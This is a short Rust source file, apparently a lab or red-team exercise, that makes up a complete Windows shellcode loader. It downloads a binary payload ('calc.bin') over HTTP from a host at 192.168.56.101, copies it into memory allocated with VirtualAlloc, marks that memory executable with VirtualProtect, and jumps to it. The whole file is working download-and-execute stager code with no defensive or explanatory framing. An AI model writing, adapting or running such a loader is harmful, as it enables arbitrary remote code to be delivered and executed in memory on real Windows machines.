use std::ptr::null;

use reqwest::blocking::Client;
use windows_sys::{
    Win32::System::Memory::{
        VirtualAlloc, 
        VirtualProtect, 
        MEM_COMMIT, 
        MEM_RESERVE, 
        PAGE_EXECUTE_READ, 
        PAGE_READWRITE
    }};


fn main() -> std::result::Result<(), reqwest::Error> {

    let client: Client = Client::new();

    let payload = client.get("http://192.168.56.101:8000/calc.bin").send()?.bytes()?;

    unsafe {
        let h_address = VirtualAlloc(
            null(), 
            payload.len(),
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        );

        std::ptr::copy_nonoverlapping(payload.as_ptr(), h_address.cast(), payload.len());

        let mut old_protection = 0;

        VirtualProtect(
            h_address, 
            payload.len(), 
            PAGE_EXECUTE_READ, 
            &mut old_protection
        );

        let exec : extern "C" fn() = std::mem::transmute(h_address);

        exec();

    }
    Ok(())
}
